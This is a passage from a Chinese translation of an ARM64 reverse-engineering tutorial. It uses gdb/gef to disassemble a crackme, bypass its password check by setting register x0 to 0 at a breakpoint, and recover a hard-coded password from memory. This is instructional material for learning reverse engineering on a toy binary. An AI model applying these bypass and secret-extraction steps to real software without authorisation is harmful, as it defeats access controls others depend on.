“ED寄存器X29。然后我们注意到从x29寄存器访问的主要函数参数。请注意，x29寄存器的偏移量28包含argc，而偏移量16包含argv（这是我们的输入密码）。在比较argc值时，如果它等于0x2，我们将（b.eq – branch if equal)分支到&lt;main + 52&gt;。2.接下来的三行&lt;main + 52&gt;，&lt;main + 56&gt;和&lt;main + 60&gt;将argv字符串的大小从16扩展到24（16 + 0x8 = 24），并由x0寄存器引用。3.然后我们调用（bl – branch with link）到&lt;check_pass&gt;函数。 我们来拆开&lt;check_pass&gt;函数。 gef&gt; disas check_pass 4.在地址 0x400738,&lt;check_pass+8&gt;，新的argv字符串从x0寄存器复制到x29寄存器。偏移量为24。然后，我们看到一些堆栈的canary操作，从&lt;check_pass+12&gt;到&lt;check_pass+24&gt;，有一些被储存在x29寄存器中，地址是0x411048，然后在函数的末尾，从&lt;check_pass + 96&gt;开始，直到&lt;check_pass + 124&gt;。5.回到&lt;check_pass&gt;函数的主体，我们看到从&lt;check_pass + 32&gt;开始，有些东西被访问从0x4008d0，并被储存到x29寄存器中，有偏移0x28(40)，可能是秘密密码?6.然后从&lt;check_pass + 60&gt;开始，x1寄存器指向从0x4008d0和x0寄存器中新复制的数据到x29寄存器中的argv字符串，偏移量为24，然后调用strcmp (x0 &amp; x1)函数。strcmp函数的返回值存储在16位通用w0寄存器中。如果字符串相等，则w0设置为0x0，否则设置为0x1。 回到&lt;main&gt;功能… 7.&lt;check_pass&gt;函数的返回值存储在w0寄存器中，该值被复制到偏移量为44的x29寄存器中。然后在&lt;main + 76&gt;处比较w0寄存器的值以查看它是否等于0x1。如果不是，我们跳转（b.ne – branch if not equal)到&lt;main + 100&gt;，这将导致我们获得成功消息，最后退出程序。现在我们将用错误的密码启动该程序。但在此之前，我们必须在&lt;main + 76&gt;的比较语句中添加断点。 gef&gt; break *0x400804 gef&gt; run pass123 我们在0x400804，&lt;main+76&gt;的比较语句中击中了断点另外，请注意x0寄存器的值是0x1。因为，x0指针只是w0寄存器+ 32位额外位，x0包含&lt;check_pass&gt;函数的返回值。从源代码中，我们知道程序将检查check_pass函数的返回值是否为1，以显示“错误密码”消息。因此，该值应该是除了0x1之外的任何值，以便程序向我们显示成功消息。 让我们改变它的价值… gef&gt; set $x0=0x0 现在让我们继续执行。 gef&gt; continue 结语原来我们的假设是正确的。将x0的值从0x1更改为0x0的技巧。这意味着它会一直检查w0是否设置为0x1来显示不正确的消息，我们从程序的源代码中知道这一点。因此，回到&lt;check_pass&gt;函数，我们注意到从地址0x4008d0复制了一些东西。我们来检查一下。 这看起来不像任何有效的汇编指令，但53的重复是可疑的，41也是十六进制的&#39;A‘。这绝对看起来像一个常量字符串。让我们看看更深。从我们的地址0x4008d0转储10多行… 查看0x4008d0和0x4008d4，我们可以看出它是little-endian 8位字符串。让我们尝试解码它… 这里我们有原始密码“ PASSWORD ”。 这只是使用gdb分析二进制文件在不同的体系结构中的一个例子。展望未来，我们将处理更复杂的程序，不常见的架构和更奇怪的二进制文件。原文地址：https://scriptdotsh.com/index.php/2018/04/26/ground-zero-part-3-reverse-engineering-basics-linux-on-arm64/","categories":[],"tags":[{"name":"安全客弃婴","slug":"安全客弃婴","permalink":"https://threst.github.io/tags/安全客弃婴/"}]}]}